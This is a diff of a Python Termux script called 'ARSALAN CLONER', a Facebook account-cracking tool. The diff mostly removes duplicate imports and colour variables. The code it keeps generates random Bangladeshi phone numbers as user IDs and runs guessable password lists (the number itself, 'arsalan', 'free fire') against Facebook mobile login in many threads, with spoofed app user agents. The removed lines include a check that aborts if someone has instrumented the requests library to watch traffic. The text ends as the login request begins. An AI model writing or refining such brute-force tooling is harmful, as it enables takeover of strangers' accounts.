@@ -2,45 +2,16 @@
 #---------------------[IMPORT]---------------------#
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as tred
-import os,sys,time,json,random,re,string,platform,base64,platform,uuid
+import os,sys,time,json,random,re,string,platform,base64,uuid
 import requests,random,sys,json,os,re
 from time import sleep
 from os import system
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
 from datetime import date
 from datetime import datetime
-from time import sleep
-from time import sleep as waktu
-from random import random as acak
-from random import choice as pilih
+import calendar,urllib,ipaddress,subprocess,marshal,rich,shutil,webbrowser
 from random import randint
-from bs4 import BeautifulSoup
-import requests as ress
-from sys import exit as exit
-
-
-#----------[ IMPORT LIBRARY ]---------- #
-import requests
-import bs4
-import sys
-import os
-import random
-import time
-import re
-import json
-import uuid
-import subprocess
-import marshal
-import rich
-import shutil
-import webbrowser
-from random import randint
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
 from bs4 import BeautifulSoup as par
-from datetime import date
-from datetime import datetime
-from datetime import date
-import marshal
+
 try:
     import requests
     from concurrent.futures import ThreadPoolExecutor as ThreadPool
@@ -48,91 +19,8 @@ try:
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures==2 > /dev/null')
-    
-from bs4 import BeautifulSoup
-from datetime import date
-from datetime import datetime
-from time import sleep
-from time import sleep as waktu
 
-#________________method__________________#
-wak='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'print' in open(wak+'sessions.py','r').read():
-    pass
-else:
-    exit('\033[1;32mMethod Error')
-fu='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'print' in open(fu+'models.py','r').read():
-    pass
-else:
-    exit('\033[1;32mMethod Error')
-su='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'print' in open(su+'utils.py','r').read():
-    pass
-else:
-    exit('\033[1;32mMethod Error')
-hu='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'print' in open(hu+'api.py','r').read():
-    pass
-else:
-    exit('\033[1;32mMethod Error')
-nu='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'print' in open(nu+'auth.py','r').read():
-    pass
-else:
-    exit('\033[1;32mMethod Error')
-dhon='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
-if not 'print' in open(dhon+'packages.py','r').read():
-    pass
-else:
-    exit('\033[1;32mMethod Error')
-
-sir = '\033[41m\x1b[1;97m'
-x = '\33[m' 
-P = '\x1b[1;97m' 
-M = '\x1b[1;91m' 
-H = '\x1b[1;92m' 
-K = '\x1b[1;93m' 
-B = '\x1b[1;94m' 
-U = '\x1b[1;95m' 
-O = '\x1b[1;96m' 
-N = '\x1b[0m'    
-A = '\x1b[1;90m' 
-BLACK = '\x1b[1;90m' 
-C = '\x1b[1;91m' 
-D = '\x1b[1;92m'
-E = '\x1b[1;93m' 
-F = '\x1b[1;94m'
-G = '\x1b[1;95m'
-
-WW = '\033[97;1m' 
-RR = '\033[91;1m' 
-GG = '\033[92;1m' 
-YY = '\033[93;1m' 
-BB = '\033[94;1m'
-PP = '\033[95;1m'
-CC = '\033[96;1m'
-NN = '\x1b[0m'
-
-RED = '\033[1;91m'
-WHITE = '\033[1;97m'
-GREEN = '\033[1;92m'
-YELLOW = '\033[1;93m'
-BLUE = '\033[1;94m'
-ORANGE = '\033[1;95m'
-BS = '\033[1;96m'
-HBF = '{ HBF }'
-my_color = [RED, WHITE, BLACK, BS, GREEN, YELLOW, ORANGE]
-COLOUR_X = random.choice(my_color)
-now = datetime.now()
-dt_string = now.strftime("%H:%M")
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-today = date.today()
-
-# ----------[ USER LINKS & CONFIG ]---------- #
+#----------[ USER LINKS & CONFIG ]---------- #
 ARSALAN_WA = "https://wa.me/923022745249"
 ARSALAN_FIREBASE = "https://arman-f9a3b-default-rtdb.firebaseio.com/keys/123"
 ARSALAN_GITHUB = "https://github.com/armankhan2k56-creator/armankhan.git"
@@ -155,7 +43,7 @@ for i in range(1):
         'com.facebook.katana',
         'com.facebook.mlite'])
     application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
-    application_version_code = str(random.randint(000000000,999999999))
+    application_version_code = str(random.randint(0,999999999))
     android_version = str(random.randrange(5,15))
     dens = str(random.randrange(0,5))
     xzx = random.choice(['Samsung', 'Galaxy A7(2016)', 'a7xltechn', 'SM-A710XZ', 'Absolute'])
@@ -213,25 +101,12 @@ hr = calendar.day_name[my_date.weekday()]
 timr = ("%s-%s-%s-%s"%(hr, ha, op, ta))
 hhh=timr.upper()
 tgl = ("%s %s %s"%(ha, op, ta))
-bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
 
 url_ip = "https://www.httpbin.org/ip"
 ipm = requests.get(url_ip).json()
     
 mm = ("p.facebook.com","d.facebook.com","m.facebook.com","x.facebook.com")
 fg = random.choice(mm)
- 
-def psb(z):
-    for e in z + '\n':
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.01)
-
-def jalan(z):
-    for e in z + '\n':
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.03)
 
 #___________________PASS LIST_______________________#
 xbook = []
@@ -283,43 +158,9 @@ time.sleep(2)
 os.system('clear')
 loading()
 
-def samiya(uid):
-    if len(uid)==15:
-        if uid[:10] in ['1000000000']       :shanto = ' (*-*) 2009'
-        elif uid[:9] in ['100000000']       :shanto = ' √ 2009'
-        elif uid[:8] in ['10000000']        :shanto = ' √ 2009'
-        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:shanto = ' √ 2009'
-        elif uid[:7] in ['1000006','1000007','1000008','1000009']:shanto = ' 2010'
-        elif uid[:6] in ['100001']          :shanto = ' √ 2010/2011'
-        elif uid[:6] in ['100002','100003'] :shanto = ' √ 2011/2012'
-        elif uid[:6] in ['100004']          :shanto = ' √ 2012/2013'
-        elif uid[:6] in ['100005','100006'] :shanto = ' √ 2013/2014'
-        elif uid[:6] in ['100007','100008'] :shanto = ' √ 2014/2015'
-        elif uid[:6] in ['100009']          :shanto = ' √ 2015'
-        elif uid[:5] in ['10001']           :shanto = ' √ 2015/2016'
-        elif uid[:5] in ['10002']           :shanto = ' √ 2016/2017'
-        elif uid[:5] in ['10003']           :shanto = ' √ 2018/2019'
-        elif uid[:5] in ['10004']           :shanto = ' √ 2019/2020'
-        elif uid[:5] in ['10005']           :shanto = ' √ 2020'
-        elif uid[:5] in ['10006','10007','']:shanto = ' √ 2021'
-        elif uid[:5] in ['10008']           :shanto = ' √ 2022'
-        elif uid[:5] in ['10009']           :shanto = ' √ 2023'
-        else:shanto=''
-    elif len(uid) in [9,10]:
-        shanto = ' √ 2008/2009'
-    elif len(uid)==8:
-        shanto = ' √ 2007/2008'
-    elif len(uid)==7:
-        shanto = ' √ 2006/2007'
-    else:shanto=''
-    return shanto
-
-def clear():
-    os.system('clear')
-
 def banner():
-    clear()
-    print(f"""{GREEN}
+    os.system('clear')
+    print(f"""\x1b[1;92m
   \033[1;91m__      _______ _____  _    _  _____    __   __
  \033[1;91m\ \    / /_   _|  __ \| |  | |/ ____|   \ \ / /
   \033[1;94m\ \  / /  | | | |__) | |  | | (___ _____\ V / 
@@ -331,12 +172,12 @@ def banner():
     \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
     ║  \x1b[97m\033[37;41m         ARSALAN CLONING SYSTEM          \033[0;m     \33[1;92m ║
     \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
-     {H} ╔════════════════════════{M}════════════════╗
-      {H}║{M}[{H}•{M}] AUTHOR    :{H} ARSALAN                 {N}{M}║
-      {H}║{M}[{H}•{M}] WHATSAPP  :{H} 03022745249             {N}{M}║
-      {H}║{M}[{H}•{M}] STATUS    : {H}ACTIVE{P}           {N}  {H}      ║
-      {H}║{M}[{H}•{M}] VERSION   : {H}2.1.1                  {H} ║
-      {M}╚═════════════{H}═══════════════════════════╝ {P}""")
+     \x1b[1;92m ╔════════════════════════\x1b[1;91m════════════════╗
+      \x1b[1;92m║\x1b[1;91m[\x1b[1;92m•\x1b[1;91m] AUTHOR    :\x1b[1;92m ARSALAN                 \x1b[1;37m\x1b[1;91m║
+      \x1b[1;92m║\x1b[1;91m[\x1b[1;92m•\x1b[1;91m] WHATSAPP  :\x1b[1;92m 03022745249             \x1b[1;37m\x1b[1;91m║
+      \x1b[1;92m║\x1b[1;91m[\x1b[1;92m•\x1b[1;91m] STATUS    : \x1b[1;92mACTIVE\x1b[1;37m           \x1b[1;37m  \x1b[1;92m      ║
+      \x1b[1;92m║\x1b[1;91m[\x1b[1;92m•\x1b[1;91m] VERSION   : \x1b[1;92m2.1.1                  \x1b[1;92m ║
+      \x1b[1;91m╚═════════════\x1b[1;92m═══════════════════════════╝ \x1b[1;37m""")
 
 loop = 0
 ok = []
@@ -349,15 +190,15 @@ def main():
     print(lol)
     print(f' ')
     IP = ipm['origin']
-    print(f'{M}╔══[•] TOOL NAME : {H}ARSALAN CLONER')
-    print(f'{M}║══[•] YOUR IP   :{H} '+IP)
-    print(f'{M}║══[•] VERSION   : {H}INFINITY')
-    print(f'{M}╚══[•] CODER NAME: {H}ARSALAN')
+    print(f'\x1b[1;91m╔══[•] TOOL NAME : \x1b[1;92mARSALAN CLONER')
+    print(f'\x1b[1;91m║══[•] YOUR IP   :\x1b[1;92m '+IP)
+    print(f'\x1b[1;91m║══[•] VERSION   : \x1b[1;92mINFINITY')
+    print(f'\x1b[1;91m╚══[•] CODER NAME: \x1b[1;92mARSALAN')
     print(f' ')
-    print(f"{M}╔══[{M}1{RED}] \033[1;32mSTART CLONING")
-    print(f"║══[{M}2{RED}] \033[1;34mCONTACT WHATSAPP")
-    print(f"║══[{M}3{RED}] \033[1;36mOPEN GITHUB REPO")
-    print(f"║══[{M}4{RED}] \033[1;35mEXIT ")
+    print(f"\x1b[1;91m╔══[\x1b[1;91m1\x1b[1;91m] \033[1;32mSTART CLONING")
+    print(f"║══[\x1b[1;91m2\x1b[1;91m] \033[1;34mCONTACT WHATSAPP")
+    print(f"║══[\x1b[1;91m3\x1b[1;91m] \033[1;36mOPEN GITHUB REPO")
+    print(f"║══[\x1b[1;91m4\x1b[1;91m] \033[1;35mEXIT ")
     sh = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
     if sh =='1':
        _xxx_()
@@ -375,14 +216,14 @@ def _xxx_():
     print(lol)
     print(f' ')
     IP = ipm['origin']
-    print(f'{M}╔══[•] TOOL NAME : {H}ARSALAN CLONER')
-    print(f'{M}║══[•] YOUR IP   :{H} '+IP)
-    print(f'{M}║══[•] VERSION   : {H}INFINITY')
-    print(f'{M}╚══[•] CODER NAME: {H}ARSALAN')
+    print(f'\x1b[1;91m╔══[•] TOOL NAME : \x1b[1;92mARSALAN CLONER')
+    print(f'\x1b[1;91m║══[•] YOUR IP   :\x1b[1;92m '+IP)
+    print(f'\x1b[1;91m║══[•] VERSION   : \x1b[1;92mINFINITY')
+    print(f'\x1b[1;91m╚══[•] CODER NAME: \x1b[1;92mARSALAN')
     print(f' ')
-    print(f"{M}╔══[{M}1{RED}] \033[1;32mRANDOM CLONING")
-    print(f"{M}╔══[{M}2{RED}] \033[1;31mGMAIL CLONING")
-    print(f"║══[{M}3{RED}] \033[1;35mBACK TO MAIN ")
+    print(f"\x1b[1;91m╔══[\x1b[1;91m1\x1b[1;91m] \033[1;32mRANDOM CLONING")
+    print(f"\x1b[1;91m╔══[\x1b[1;91m2\x1b[1;91m] \033[1;31mGMAIL CLONING")
+    print(f"║══[\x1b[1;91m3\x1b[1;91m] \033[1;35mBACK TO MAIN ")
     sh = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
     if sh =='1':
        _pornhub_()
@@ -397,14 +238,14 @@ def _xnxx_():
     banner()
     print(f' ')
     IP = ipm['origin']
-    print(f'{M}╔══[•] TOOL NAME : {H}ARSALAN CLONER')
-    print(f'{M}║══[•] YOUR IP   :{H} '+IP)
-    print(f'{M}║══[•] VERSION   : {H}INFINITY')
-    print(f'{M}╚══[•] CODER NAME: {H}ARSALAN')
+    print(f'\x1b[1;91m╔══[•] TOOL NAME : \x1b[1;92mARSALAN CLONER')
+    print(f'\x1b[1;91m║══[•] YOUR IP   :\x1b[1;92m '+IP)
+    print(f'\x1b[1;91m║══[•] VERSION   : \x1b[1;92mINFINITY')
+    print(f'\x1b[1;91m╚══[•] CODER NAME: \x1b[1;92mARSALAN')
     print(f" ")
-    print(f"{RED}╔══[{M}1{M}] {RED}RANDOM USER NAME")
-    print(f"║══[{M}2{RED}] {GREEN}RANDOM GMAIL CLONING")
-    print(f"╚══[{M}3{RED}] {BLACK}BACK")
+    print(f"\x1b[1;91m╔══[\x1b[1;91m1\x1b[1;91m] \x1b[1;91mRANDOM USER NAME")
+    print(f"║══[\x1b[1;91m2\x1b[1;92m] \x1b[1;92mRANDOM GMAIL CLONING")
+    print(f"╚══[\x1b[1;91m3\x1b[1;91m] \x1b[1;90mBACK")
     sh = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
     if sh =='1':
        user()
@@ -416,19 +257,18 @@ def _xnxx_():
 def _pornhub_():
     os.system('clear')
     loading()
-    os.system('clear')
     banner()
     print(f' ')
     IP = ipm['origin']
-    print(f'{M}╔══[•] TOOL NAME : {H}ARSALAN CLONER')
-    print(f'{M}║══[•] YOUR IP   :{H} '+IP)
-    print(f'{M}║══[•] VERSION   : {H}INFINITY')
-    print(f'{M}╚══[•] CODER NAME: {H}ARSALAN')
+    print(f'\x1b[1;91m╔══[•] TOOL NAME : \x1b[1;92mARSALAN CLONER')
+    print(f'\x1b[1;91m║══[•] YOUR IP   :\x1b[1;92m '+IP)
+    print(f'\x1b[1;91m║══[•] VERSION   : \x1b[1;92mINFINITY')
+    print(f'\x1b[1;91m╚══[•] CODER NAME: \x1b[1;92mARSALAN')
     print(" ")
-    print(f"{M}╔══[{H}1{M}] {GREEN}RANDOM BD ID CLONING")
-    print(f"║══[{H}2{M}] {M}RANDOM INDIA CLONING")
-    print(f"║══[{H}3{M}] {H}RANDOM PAK CLONING")
-    print(f"╚══[{H}4{M}] {B}RANDOM INDONESIA CLONING")
+    print(f"\x1b[1;91m╔══[\x1b[1;92m1\x1b[1;91m] \x1b[1;92mRANDOM BD ID CLONING")
+    print(f"║══[\x1b[1;91m2\x1b[1;91m] \x1b[1;91mRANDOM INDIA CLONING")
+    print(f"║══[\x1b[1;92m3\x1b[1;91m] \x1b[1;92mRANDOM PAK CLONING")
+    print(f"╚══[\x1b[1;94m4\x1b[1;91m] \x1b[1;94mRANDOM INDONESIA CLONING")
     sh = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
     if sh =='1':
        shbd()
@@ -439,20 +279,14 @@ def _pornhub_():
     else:
        shindo()
 
-def _pompom_():
-    pass
-        
-def _FUCKER_():
-    pass
-
 def shbd():
     user=[]
     clear()
     banner()
-    print(f"                 {H} BD CRACK {P} ");time.sleep(0.05)
-    print('   \033[1;92m BD CODE: {P}[{H}016{P}][{B}017{P}][{K}019{P}]')
-    code = input(f' CHOOSE :{H} ')
-    limit = int(input(f'    %s[%s?%s] CRACK ID LIMIT : %s'%(N,K,N,H)))
+    print(f"                 \x1b[1;92m BD CRACK \x1b[1;37m ");time.sleep(0.05)
+    print('   \033[1;92m BD CODE: \x1b[1;37m[\x1b[1;92m016\x1b[1;37m][\x1b[1;94m017\x1b[1;37m][\x1b[1;93m019\x1b[1;37m]')
+    code = input(f' CHOOSE :\x1b[1;92m ')
+    limit = int(input(f'    \x1b[1;37m[\x1b[1;93m?\x1b[1;37m] CRACK ID LIMIT : \x1b[1;92m'))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
@@ -465,30 +299,18 @@ def shbd():
             pwx = [(code+love), (love), ('arsalan'), ('free fire')]
             smiyaaa.submit(m, uid, pwx, tl)
 
-def shind():
-    pass
-
-def shpak():
-    pass
-
-def shindo():
-    pass
-
-def gmail():
-    pass
-
-def user():
-    pass
-
-hello = []
-shanto = []
+def shind(): pass
+def shpak(): pass
+def shindo(): pass
+def gmail(): pass
+def user(): pass
     
 def m(uid,pwx,tl):
     global loop, ok, lok, twf, numan
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r    {P}[ARSALAN][{K}%s{P}/{B}%s{P}][{H}OK{P}/{M}LOK{P}] \r'%(loop,tl)),
+            sys.stdout.write(f'\r    \x1b[1;37m[ARSALAN][\x1b[1;93m%s\x1b[1;37m/\x1b[1;94m%s\x1b[1;37m][\x1b[1;92mOK\x1b[1;37m/\x1b[1;91mLOK\x1b[1;37m] \r'%(loop,tl)),
             sys.stdout.flush()
             nn = random.choice(numan)
             req_url = session.get(f'https://{fg}').text
